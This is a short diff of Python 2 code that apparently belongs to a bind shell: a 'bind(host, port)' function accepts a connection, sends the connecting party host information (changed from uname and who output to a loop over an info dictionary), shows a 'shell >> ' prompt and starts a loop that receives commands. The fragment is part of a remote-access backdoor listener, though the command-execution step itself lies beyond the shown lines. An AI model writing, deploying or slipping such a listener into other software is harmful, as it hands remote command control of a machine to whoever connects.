@@ -24,8 +24,8 @@ def bind(host, port):
         sys.exit(1)
 
     conn, addr = server.accept()
-    conn.sendall(uname)
-    conn.sendall(who)
+    for k, v in info.iteritems():
+        conn.sendall('%s\t%s' % (k, v))
     conn.sendall("\nshell >> ")
     while True:
         cmd = conn.recv(socksize)
